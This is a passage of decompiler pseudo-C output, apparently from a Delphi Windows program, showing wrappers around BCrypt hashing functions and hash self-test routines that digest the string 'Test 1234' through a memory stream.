      sub_4398E0(L"BCryptDestroyHash ", v3, a2);
    *(_DWORD *)(a1 + 12) = 0;
  }
  System::__linkproc__ FreeMem(*v5);
  result = a1 + 8;
  *v5 = 0;
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 43B0B8: using guessed type wchar_t aBcryptdestroyh_2[19];
// 467ECC: using guessed type int *off_467ECC[2];

//----- (0043B0E0) --------------------------------------------------------
int __usercall sub_43B0E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  signed int v3; // eax
  int result; // eax
  int v5; // [esp+0h] [ebp-4h]

  v5 = a1 + 8;
  v3 = (*(int (__stdcall **)(_DWORD, int, int, _DWORD))off_46813C[0])(*(_DWORD *)(a1 + 12), a2, 16, 0);
  if ( v3 < 0 )
    sub_4398E0(L"BCryptFinishHash ", v3, a3);
  result = v5;
  *(_BYTE *)(v5 + 8) = 0;
  return result;
}
// 43B12C: using guessed type wchar_t aBcryptfinishha_0[18];
// 46813C: using guessed type int *off_46813C[3];

//----- (0043B150) --------------------------------------------------------
int __usercall sub_43B150@<eax>(int a1@<eax>, int a2@<edi>)
{
  int result; // eax
  char v3[16]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  v4 = a1 + 8;
  result = a1 + 8;
  if ( *(_BYTE *)(result + 8) )
  {
    result = (*(int (__stdcall **)(_DWORD, char *, int, _DWORD))off_46813C[0])(*(_DWORD *)(v4 + 4), v3, 16, 0);
    if ( result < 0 )
      return sub_4398E0(L"BCryptFinishHash ", result, a2);
  }
  return result;
}
// 43B1A4: using guessed type wchar_t aBcryptfinishha_1[18];
// 46813C: using guessed type int *off_46813C[3];
// 43B150: using guessed type char var_14[16];

//----- (0043B1D0) --------------------------------------------------------
int __usercall sub_43B1D0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int result; // eax

  *(_BYTE *)(a1 + 16) = 1;
  result = ((int (__stdcall *)(_DWORD, int, int, _DWORD))*off_467EE8)(*(_DWORD *)(a1 + 12), a2, a3, 0);
  if ( result < 0 )
    return sub_4398E0(L"BCryptHashData ", result, a4);
  return result;
}
// 43B218: using guessed type wchar_t aBcrypthashdata_0[16];
// 467EE8: using guessed type int *off_467EE8;

//----- (0043B240) --------------------------------------------------------
int sub_43B240()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_43B2BC;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46EDBC )
  {
    sub_4386C0();
    sub_408B34(&dword_4673A0, (int)&byte_43798C);
    sub_408B34(&dword_4673A8, (int)&byte_437AB0);
    sub_408B34(&dword_4673AC, (int)&byte_437BD4);
    sub_408B34(&dword_4673B0, (int)&byte_437CFC);
    sub_408B34(&dword_4673B4, (int)&byte_437E28);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 43798C: using guessed type char byte_43798C;
// 437AB0: using guessed type char byte_437AB0;
// 437BD4: using guessed type char byte_437BD4;
// 437CFC: using guessed type char byte_437CFC;
// 437E28: using guessed type char byte_437E28;
// 4673A0: using guessed type int dword_4673A0;
// 4673A8: using guessed type int dword_4673A8;
// 4673AC: using guessed type _DWORD dword_4673AC;
// 4673B0: using guessed type _DWORD dword_4673B0;
// 4673B4: using guessed type _DWORD dword_4673B4;
// 46EDBC: using guessed type int dword_46EDBC;

//----- (0043B2D0) --------------------------------------------------------
int __fastcall sub_43B2D0(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (0043B2F0) --------------------------------------------------------
int __fastcall sub_43B2F0(int a1, void *a2, unsigned int a3)
{
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v6 = (*(int (__fastcall **)(int))(*(_DWORD *)a1 + 24))(a1);
  if ( a3 <= 4 )
    return System::Move(&v6, a2, a3);
  else
    return System::Move(&v6, a2, 4);
}

//----- (0043B330) --------------------------------------------------------
int __fastcall sub_43B330(int a1, int a2, int a3)
{
  (**(void (__fastcall ***)(int))a1)(a1);
  (*(void (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 4))(a1, a2, a3);
  return (*(int (__fastcall **)(int))(*(_DWORD *)a1 + 24))(a1);
}

//----- (0043B370) --------------------------------------------------------
int __usercall sub_43B370@<eax>(
        struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>,
        int a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  __int32 v4; // eax
  int v5; // ecx
  void *v6; // eax
  __int32 v7; // ebx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // esi
  int v13; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-70h] [ebp-D0h] BYREF
  int (__cdecl *v16)(int, int); // [esp-6Ch] [ebp-CCh]
  int (**v17)(); // [esp-68h] [ebp-C8h]
  int v18; // [esp-64h] [ebp-C4h]
  int v19; // [esp-60h] [ebp-C0h]
  int v20; // [esp-5Ch] [ebp-BCh]
  int v21; // [esp-58h] [ebp-B8h]
  int v22; // [esp-54h] [ebp-B4h]
  int v23; // [esp-50h] [ebp-B0h]
  int v24; // [esp-4Ch] [ebp-ACh]
  int v25; // [esp-48h] [ebp-A8h]
  int v26; // [esp-44h] [ebp-A4h]
  int v27; // [esp-40h] [ebp-A0h]
  int v28; // [esp-3Ch] [ebp-9Ch]
  int v29; // [esp-38h] [ebp-98h]
  int v30; // [esp-34h] [ebp-94h]
  int v31; // [esp-30h] [ebp-90h]
  int v32; // [esp-2Ch] [ebp-8Ch]
  int v33; // [esp-28h] [ebp-88h]
  int v34; // [esp-24h] [ebp-84h]
  int v35; // [esp-20h] [ebp-80h]
  int v36; // [esp-1Ch] [ebp-7Ch]
  int v37; // [esp-18h] [ebp-78h]
  int v38; // [esp-14h] [ebp-74h]
  int v39; // [esp-10h] [ebp-70h]
  int v40; // [esp-Ch] [ebp-6Ch]
  int v41; // [esp-8h] [ebp-68h]
  int v42; // [esp-4h] [ebp-64h]
  __int64 v43; // [esp+0h] [ebp-60h]
  __int64 v44; // [esp+8h] [ebp-58h]
  __int64 v45; // [esp+10h] [ebp-50h]
  int v46; // [esp+18h] [ebp-48h]
  int Mem; // [esp+1Ch] [ebp-44h]
  int v48; // [esp+20h] [ebp-40h]
  int (__cdecl *v49)(int, int); // [esp+24h] [ebp-3Ch]
  int v50; // [esp+28h] [ebp-38h]
  int (__cdecl *v51)(int, int); // [esp+2Ch] [ebp-34h]
  int (__cdecl *v52)(int, int); // [esp+30h] [ebp-30h]
  int (__cdecl *v53)(int, int); // [esp+34h] [ebp-2Ch]
  int v54; // [esp+38h] [ebp-28h]
  int v55; // [esp+3Ch] [ebp-24h]
  int v56; // [esp+40h] [ebp-20h]
  int v57; // [esp+44h] [ebp-1Ch]
  int v58; // [esp+48h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *v59; // [esp+4Ch] [ebp-14h] BYREF
  int (__cdecl *v60)(int, int); // [esp+50h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *v61; // [esp+54h] [ebp-Ch] BYREF
  void *v62; // [esp+58h] [ebp-8h] BYREF
  int (**v63)(); // [esp+5Ch] [ebp-4h] BYREF
  int (*savedregs)(); // [esp+60h] [ebp+0h] BYREF

  v20 = a2;
  v19 = a4;
  v18 = a3;
  v63 = 0;
  v62 = 0;
  v61 = a1;
  v17 = &savedregs;
  v16 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_407030((volatile __int32 *)&v63, (__int32)L"Test 1234");
  sub_407030((volatile __int32 *)&v62, (__int32)v63);
  v54 = 5;
  do
  {
    sub_407910((volatile __int32 *)&v62, v62);
    --v54;
  }
  while ( v54 );
  v58 = sub_407790((int)v63);
  v4 = (__int32)v63;
  if ( v63 )
    v4 = (__int32)*(v63 - 1);
  v56 = 2 * v4;
  v57 = sub_407790((int)v62);
  v6 = v62;
  if ( v62 )
    v6 = (void *)*((_DWORD *)v62 - 1);
  v55 = 2 * (_DWORD)v6;
  v7 = (__int32)v63;
  if ( v63 )
    v7 = (__int32)*(v63 - 1);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *, int, struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int), struct _EXCEPTION_REGISTRATION_RECORD *, int, int, int, int, int, int (__cdecl *)(int, int), int (__cdecl *)(int, int), int (__cdecl *)(int, int), int, int (__cdecl *)(int, int), int, int, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int (**)(), int (__cdecl *)(int, int), struct _EXCEPTION_REGISTRATION_RECORD *))v61->Next->Next)(
    v61,
    v61->Next,
    v5,
    v61,
    v60,
    v59,
    v58,
    v57,
    v56,
    v55,
    v54,
    v53,
    v52,
    v51,
    v50,
    v49,
    v48,
    Mem,
    v46,
    HIDWORD(v45),
    v45,
    HIDWORD(v44),
    v44,
    HIDWORD(v43),
    v43,
    v42,
    v41,
    v40,
    v39,
    v38,
    v37,
    v36,
    v35,
    v34,
    v33,
    v32,
    v31,
    v30,
    v29,
    v28,
    v27,
    v26,
    v25,
    v24,
    v23,
    v22,
    v21,
    v20,
    v19,
    v18,
    v17,
    v16,
    ExceptionList);
  v8 = sub_407790((int)v63);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, __int32))v61->Next->Handler)(v61, v8, 2 * v7);
  v52 = (int (__cdecl *)(int, int))((int (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))v61->Next[3].Next)(v61);
  v53 = v52;
  v60 = v52;
  LOBYTE(v9) = 1;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int), int))v61->Next[2].Handler)(
    v61,
    v52,
    v9);
  v50 = 0;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))v61->Next->Next)(v61);
  v10 = sub_407790(0);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))v61->Next->Handler)(v61, v10, 2 * v50);
  v49 = (int (__cdecl *)(int, int))((int (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))v61->Next[3].Next)(v61);
  v51 = v49;
  v60 = v49;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int), _DWORD))v61->Next[2].Handler)(
    v61,
    v49,
    0);
  v59 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v63 = &savedregs;
  v62 = System::__linkproc__ HandleFinally;
  v61 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v61);
  sub_427610((int)v59, v58, v56, a3);
  Classes::TStream::SetPosition(0, 0i64);
  v45 = ((__int64 (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *, int, struct _EXCEPTION_REGISTRATION_RECORD *))v59->Next->Next)(
          v59,
          v59->Next,
          v11,
          v61);
  if ( v45 >= 4096 )
    v12 = 4096;
  else
    v12 = v45;
  Mem = System::__linkproc__ GetMem(v12);
  v63 = &savedregs;
  v62 = System::__linkproc__ HandleFinally;
  v61 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v61);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *))v61->Next->Next)(
    v61,
    v61->Next);
  v44 = sub_427470(v59);
  v43 = 0i64;
  v61 = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v60 = System::__linkproc__ HandleFinally;
  v59 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v59);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int), struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, _DWORD))v59->Next[2].Handler)(
    v59,
    0,
    v59->Next,
    System::__linkproc__ HandleFinally,
    v59,
    0,
    0);
  do
  {
    v13 = ((int (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))v59->Next[1].Handler)(v59, Mem, v12);
    v43 += v13;
    ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))v61->Next->Handler)(v61, Mem, v13);
  }
  while ( v13 && v43 != v45 );
  __writefsdword(0, (unsigned int)v62);
  savedregs = sub_43B5B6;
  return ((int (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, _DWORD))v59->Next[2].Handler)(
           v59,
           0,
           v59->Next,
           HIDWORD(v44),
           v44);
}
// 43B40D: variable 'v5' is possibly undefined
// 43B446: variable 'v9' is possibly undefined
// 43B4DC: variable 'v11' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 43B5AF: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43B5B6: using guessed type int sub_43B5B6();
// 43B5D7: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43B73F: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43BA45: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43BA60: using guessed type wchar_t aTest1234[10];

//----- (0043BA80) --------------------------------------------------------
int __fastcall sub_43BA80(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (0043BAA0) --------------------------------------------------------
int __fastcall sub_43BAA0(int a1, void *a2, unsigned int a3)
{
  char v6[16]; // [esp+Ch] [ebp-10h] BYREF

  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 24))(a1, v6);
  if ( a3 <= 0x10 )
    return System::Move(v6, a2, a3);
  else
    return System::Move(v6, a2, 16);
}

//----- (0043BAF0) --------------------------------------------------------
int __fastcall sub_43BAF0(int a1, int a2, _DWORD *a3)
{
  int v5; // ebx
  int v6; // eax
  int result; // eax
  _DWORD *v8; // edi
  _DWORD v9[4]; // [esp+Ch] [ebp-14h] BYREF
  _DWORD *v10; // [esp+1Ch] [ebp-4h]

  v10 = a3;
  v5 = a2;
  if ( a2 )
    v5 = *(_DWORD *)(a2 - 4);
  (**(void (__fastcall ***)(int))a1)(a1);
  v6 = sub_407790(a2);
  (*(void (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 4))(a1, v6, 2 * v5);
  result = (*(int (__fastcall **)(int, _DWORD *))(*(_DWORD *)a1 + 24))(a1, v9);
  v8 = v10;
  *v10 = v9[0];
  *++v8 = v9[1];
  *++v8 = v9[2];
  v8[1] = v9[3];
  return result;
}
// 43BAF0: using guessed type _DWORD var_14[4];

//----- (0043BB40) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_43BB40@<eax>(
        struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>,
        int a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  __int32 v4; // eax
  void *v5; // eax
  __int32 v6; // ebx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // esi
  int v12; // ebx
  _DWORD v14[38]; // [esp-98h] [ebp-170h] BYREF
  int v15; // [esp+0h] [ebp-D8h] BYREF
  int v16; // [esp+4h] [ebp-D4h]
  int v17; // [esp+8h] [ebp-D0h]
  int v18; // [esp+Ch] [ebp-CCh]
  int v19; // [esp+10h] [ebp-C8h]
  int v20; // [esp+14h] [ebp-C4h]
  int v21; // [esp+18h] [ebp-C0h]
  int v22; // [esp+1Ch] [ebp-BCh]
  int v23; // [esp+20h] [ebp-B8h] BYREF
  int v24; // [esp+24h] [ebp-B4h]
  int v25; // [esp+28h] [ebp-B0h]
  int v26; // [esp+2Ch] [ebp-ACh]
  int v27; // [esp+30h] [ebp-A8h]
  int v28; // [esp+34h] [ebp-A4h]
  int v29; // [esp+38h] [ebp-A0h]
  int v30; // [esp+3Ch] [ebp-9Ch]
  int v31; // [esp+40h] [ebp-98h] BYREF
  int v32; // [esp+44h] [ebp-94h]
  int v33; // [esp+48h] [ebp-90h]
  int v34; // [esp+4Ch] [ebp-8Ch]
  int v35; // [esp+50h] [ebp-88h] BYREF
  __int64 v36; // [esp+90h] [ebp-48h]
  __int64 v37; // [esp+98h] [ebp-40h]
  __int64 v38; // [esp+A0h] [ebp-38h]
  int Mem; // [esp+ACh] [ebp-2Ch]
  int v40; // [esp+B0h] [ebp-28h]
  int v41; // [esp+B4h] [ebp-24h]
  int v42; // [esp+B8h] [ebp-20h]
  int v43; // [esp+BCh] [ebp-1Ch]
  int v44; // [esp+C0h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *v45; // [esp+C4h] [ebp-14h] BYREF
  _DWORD *v46; // [esp+C8h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+CCh] [ebp-Ch] BYREF
  void *v48; // [esp+D0h] [ebp-8h] BYREF
  int (**v49)(); // [esp+D4h] [ebp-4h] BYREF
  int (*savedregs)(); // [esp+D8h] [ebp+0h] BYREF

  v14[5] = a2;
  v14[4] = a4;
  v14[3] = a3;
  v49 = 0;
  v48 = 0;
  ExceptionList = a1;
  v14[2] = &savedregs;
  v14[1] = System::__linkproc__ HandleFinally;
  v14[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  sub_407030((volatile __int32 *)&v49, (__int32)L"Test 1234");
  sub_407030((volatile __int32 *)&v48, (__int32)v49);
  v41 = 5;
  do
  {
    sub_407910((volatile __int32 *)&v48, v48);
    --v41;
  }
  while ( v41 );
  v45 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_407790((int)v49);
  v4 = (__int32)v49;
  if ( v49 )
    v4 = (__int32)*(v49 - 1);
  v43 = 2 * v4;
  v44 = sub_407790((int)v48);
  v5 = v48;
  if ( v48 )
    v5 = (void *)*((_DWORD *)v48 - 1);
  v42 = 2 * (_DWORD)v5;
  v6 = (__int32)v49;
  if ( v49 )
    v6 = (__int32)*(v49 - 1);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v7 = sub_407790((int)v49);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, __int32))ExceptionList->Next->Handler)(
    ExceptionList,
    v7,
    2 * v6);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *))ExceptionList->Next[3].Next)(
    ExceptionList,
    &v23);
  v27 = v23;
  v28 = v24;
  v29 = v25;
  v30 = v26;
  v31 = v23;
  v32 = v24;
  v33 = v25;
  v34 = v26;
  LOBYTE(v8) = 1;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, int))ExceptionList->Next[2].Handler)(
    ExceptionList,
    &v31,
    v8);
  v40 = 0;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v9 = sub_407790(0);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
    ExceptionList,
    v9,
    2 * v40);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *))ExceptionList->Next[3].Next)(
    ExceptionList,
    &v15);
  v19 = v15;
  v20 = v16;
  v21 = v17;
  v22 = v18;
  v31 = v15;
  v32 = v16;
  v33 = v17;
  v34 = v18;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, _DWORD))ExceptionList->Next[2].Handler)(
    ExceptionList,
    &v31,
    0);
  v46 = (_DWORD *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v49 = &savedregs;
  v48 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_427610((int)v46, (int)v45, v43, (int)&v35);
  Classes::TStream::SetPosition(0, 0i64);
  v38 = ((__int64 (__fastcall *)(_DWORD *, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))*(_DWORD *)*v46)(
          v46,
          *v46,
          v10,
          ExceptionList);
  if ( v38 >= 4096 )
    v11 = 4096;
  else
    v11 = v38;
  Mem = System::__linkproc__ GetMem(v11);
  v49 = &savedregs;
  v48 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(
    ExceptionList,
    ExceptionList->Next);
  v37 = sub_427470(v46);
  v36 = 0i64;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v46 = System::__linkproc__ HandleFinally;
  v45 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v45);
  (*(void (__stdcall **)(_DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD (__cdecl *)(_DWORD, _DWORD), int (**)()))(*(_DWORD *)System::__linkproc__ HandleFinally + 20))(
    0,
    0,
    v45,
    System::__linkproc__ HandleFinally,
    &savedregs);
  do
  {
    v12 = (*(int (__fastcall **)(_DWORD *, int, int))(*v46 + 12))(v46, Mem, v11);
    v36 += v12;
    ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
      ExceptionList,
      Mem,
      v12);
  }
  while ( v12 && v36 != v38 );
  __writefsdword(0, (unsigned int)v48);
  savedregs = sub_43BDBA;
  return (*(int (__fastcall **)(_DWORD *, _DWORD, _DWORD, _DWORD, _DWORD))(*v46 + 20))(v46, 0, *v46, HIDWORD(v37), v37);
}
// 43BBDD: bad sp value at call
// 43BC00: bad sp value at call
// 43BC30: bad sp value at call
// 43BC71: bad sp value at call
// 43BCA1: bad sp value at call
// 43BCCA: bad sp value at call
// 43BC30: variable 'v8' is possibly undefined
// 43BCE0: variable 'v10' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 43BDB3: using guessed type _DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD);
// 43BDBA: using guessed type int sub_43BDBA();
// 43BDDE: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43BF63: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43C25E: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43C278: using guessed type wchar_t aTest1234_0[10];

//----- (0043C290) --------------------------------------------------------
int __fastcall sub_43C290(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (0043C2B0) --------------------------------------------------------
int __fastcall sub_43C2B0(int a1, void *a2, unsigned int a3)
{
  char v6[20]; // [esp+Ch] [ebp-14h] BYREF

  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 24))(a1, v6);
  if ( a3 <= 0x14 )
    return System::Move(v6, a2, a3);
  else
    return System::Move(v6, a2, 20);
}

//----- (0043C300) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_43C300@<eax>(
        struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>,
        int a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  __int32 v4; // eax
  void *v5; // eax
  __int32 v6; // ebx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // esi
  int v12; // ebx
  _DWORD v14[46]; // [esp-B8h] [ebp-1A4h] BYREF
  int v15; // [esp+0h] [ebp-ECh] BYREF
  int v16; // [esp+4h] [ebp-E8h]
  int v17; // [esp+8h] [ebp-E4h]
  int v18; // [esp+Ch] [ebp-E0h]
  int v19; // [esp+10h] [ebp-DCh]
  int v20; // [esp+14h] [ebp-D8h]
  int v21; // [esp+18h] [ebp-D4h]
  int v22; // [esp+1Ch] [ebp-D0h]
  int v23; // [esp+20h] [ebp-CCh]
  int v24; // [esp+24h] [ebp-C8h]
  int v25; // [esp+28h] [ebp-C4h] BYREF
  int v26; // [esp+2Ch] [ebp-C0h]
  int v27; // [esp+30h] [ebp-BCh]
  int v28; // [esp+34h] [ebp-B8h]
  int v29; // [esp+38h] [ebp-B4h]
  int v30; // [esp+3Ch] [ebp-B0h]
  int v31; // [esp+40h] [ebp-ACh]
  int v32; // [esp+44h] [ebp-A8h]
  int v33; // [esp+48h] [ebp-A4h]
  int v34; // [esp+4Ch] [ebp-A0h]
  int v35; // [esp+50h] [ebp-9Ch] BYREF
  int v36; // [esp+54h] [ebp-98h]
  int v37; // [esp+58h] [ebp-94h]
  int v38; // [esp+5Ch] [ebp-90h]
  int v39; // [esp+60h] [ebp-8Ch]
  int v40; // [esp+64h] [ebp-88h] BYREF
  __int64 v41; // [esp+A4h] [ebp-48h]
  __int64 v42; // [esp+ACh] [ebp-40h]
  __int64 v43; // [esp+B4h] [ebp-38h]
  int Mem; // [esp+C0h] [ebp-2Ch]
  int v45; // [esp+C4h] [ebp-28h]
  int v46; // [esp+C8h] [ebp-24h]
  int v47; // [esp+CCh] [ebp-20h]
  int v48; // [esp+D0h] [ebp-1Ch]
  int v49; // [esp+D4h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *v50; // [esp+D8h] [ebp-14h] BYREF
  _DWORD *v51; // [esp+DCh] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+E0h] [ebp-Ch] BYREF
  void *v53; // [esp+E4h] [ebp-8h] BYREF
  int (**v54)(); // [esp+E8h] [ebp-4h] BYREF
  int (*savedregs)(); // [esp+ECh] [ebp+0h] BYREF

  v14[5] = a2;
  v14[4] = a4;
  v14[3] = a3;
  v54 = 0;
  v53 = 0;
  ExceptionList = a1;
  v14[2] = &savedregs;
  v14[1] = System::__linkproc__ HandleFinally;
  v14[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  sub_407030((volatile __int32 *)&v54, (__int32)L"Test 1234");
  sub_407030((volatile __int32 *)&v53, (__int32)v54);
  v46 = 5;
  do
  {
    sub_407910((volatile __int32 *)&v53, v53);
    --v46;
  }
  while ( v46 );
  v50 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_407790((int)v54);
  v4 = (__int32)v54;
  if ( v54 )
    v4 = (__int32)*(v54 - 1);
  v48 = 2 * v4;
  v49 = sub_407790((int)v53);
  v5 = v53;
  if ( v53 )
    v5 = (void *)*((_DWORD *)v53 - 1);
  v47 = 2 * (_DWORD)v5;
  v6 = (__int32)v54;
  if ( v54 )
    v6 = (__int32)*(v54 - 1);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v7 = sub_407790((int)v54);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, __int32))ExceptionList->Next->Handler)(
    ExceptionList,
    v7,
    2 * v6);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *))ExceptionList->Next[3].Next)(
    ExceptionList,
    &v25);
  v30 = v25;
  v31 = v26;
  v32 = v27;
  v33 = v28;
  v34 = v29;
  v35 = v25;
  v36 = v26;
  v37 = v27;
  v38 = v28;
  v39 = v29;
  LOBYTE(v8) = 1;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, int))ExceptionList->Next[2].Handler)(
    ExceptionList,
    &v35,
    v8);
  v45 = 0;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v9 = sub_407790(0);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
    ExceptionList,
    v9,
    2 * v45);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *))ExceptionList->Next[3].Next)(
    ExceptionList,
    &v15);
  v20 = v15;
  v21 = v16;
  v22 = v17;
  v23 = v18;
  v24 = v19;
  v35 = v15;
  v36 = v16;
  v37 = v17;
  v38 = v18;
  v39 = v19;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, _DWORD))ExceptionList->Next[2].Handler)(
    ExceptionList,
    &v35,
    0);
